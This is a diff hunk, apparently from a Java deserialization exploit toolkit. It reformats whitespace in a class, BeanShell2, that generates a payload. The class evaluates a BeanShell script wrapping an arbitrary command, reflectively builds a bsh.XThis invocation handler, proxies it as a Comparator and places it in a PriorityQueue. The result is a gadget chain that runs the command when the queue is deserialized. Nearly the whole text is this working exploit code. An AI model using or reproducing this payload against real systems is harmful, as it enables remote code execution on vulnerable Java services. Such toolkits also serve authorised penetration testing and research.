@@ -20,16 +20,16 @@ import java.util.PriorityQueue;
 public class BeanShell2 implements ObjectPayload<PriorityQueue> {
 
     public PriorityQueue getObject(String command) throws Exception {
-        String      payload = BeanShellUtil.makeBeanShellPayload(command);
-        Interpreter i       = new Interpreter();
+        String payload = BeanShellUtil.makeBeanShellPayload(command);
+        Interpreter i = new Interpreter();
 
         Method setu = i.getClass().getDeclaredMethod("setu", String.class, Object.class);
         setu.setAccessible(true);
         setu.invoke(i, "bsh.cwd", ".");
         i.eval(payload);
 
-        Class<?> xthis        = Class.forName("bsh.XThis");
-        Field    handlerField = xthis.getDeclaredField("invocationHandler");
+        Class<?> xthis = Class.forName("bsh.XThis");
+        Field handlerField = xthis.getDeclaredField("invocationHandler");
         handlerField.setAccessible(true);
         Constructor<?> xthisDeclaredConstructor = xthis.getDeclaredConstructor(NameSpace.class, Interpreter.class);
         xthisDeclaredConstructor.setAccessible(true);
@@ -38,7 +38,7 @@ public class BeanShell2 implements ObjectPayload<PriorityQueue> {
         InvocationHandler handler = (InvocationHandler) handlerField.get(xt);
 
         Comparator<? super Object> comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
-        PriorityQueue<Object>      queue      = new PriorityQueue(2);
+        PriorityQueue<Object> queue = new PriorityQueue(2);
         queue.add("1");
         queue.add("2");
 
